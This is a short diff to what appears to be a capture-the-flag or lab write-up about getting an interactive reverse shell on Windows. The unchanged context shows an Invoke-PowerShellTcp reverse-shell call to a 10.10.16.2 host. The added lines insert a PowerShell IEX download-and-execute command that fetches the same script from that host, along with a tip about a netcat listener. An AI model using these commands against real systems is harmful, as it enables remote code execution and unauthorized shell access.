@@ -78,6 +78,11 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 443 -Rows 37 -Cols 189
 > To get the file in rows and columns of the screen we can execute the stty size on our attacker machine.
 {: .prompt-info }
 
+Then from the shell we get, we only need need to execute the followin powershell command:
+```powershell
+powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2/Invoke-PowerShellTcp.ps1')"
+```
+
 > Don't forget to open your listener with netcat locally.
 {: .prompt-tip }
 Examples:
